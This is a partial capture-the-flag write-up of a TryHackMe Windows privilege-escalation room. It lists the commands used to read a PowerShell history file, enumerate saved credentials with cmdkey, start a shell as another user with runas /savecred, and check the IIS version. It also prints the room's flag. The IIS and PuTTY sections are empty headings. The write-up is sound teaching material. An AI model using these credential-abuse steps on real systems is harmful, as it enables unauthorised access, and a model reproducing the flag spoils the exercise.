# About This Module
Module link: https://tryhackme.com/room/windowsprivesc20

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 07/08/2023

# PowerShell History
1. Started this room's machine
2. `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` from the compromised Windows machine
```PowerShell
C:\Users\thm-unpriv>%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

![]()

# Saved Windows Credentials
1. Started this room's machine
2. `cmdkey /list`
```PowerShell
C:\Users\thm-unpriv>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=WPRIVESC1\mike.katz
    Type: Domain Password
    User: WPRIVESC1\mike.katz
```
3. `runas /savecred /user:WPRIVESC1\mike.katz cmd.exe`
```PowerShell
C:\Users\thm-unpriv>runas /savecred /user:WPRIVESC1\mike.katz cmd.exe
Attempting to start cmd.exe as user "WPRIVESC1\mike.katz" ...
```
```PowerShell
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

4. `dir <FLAG TEXT FILE PATH>`
```PowerShell
C:\Windows\system32>type C:\Users\mike.katz\Desktop\flag.txt
THM{WHAT_IS_MY_PASSWORD}
```

5. `PowerShell`
```PowerShell
C:\Windows\system32>PowerShell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
```
6. `(Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\InetStp').MajorVersion`
```PowerShell
PS C:\Windows\system32> (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\InetStp').MajorVersion
10
```

# IIS Configuration

# Retrieve Credentials from Software: PuTTY
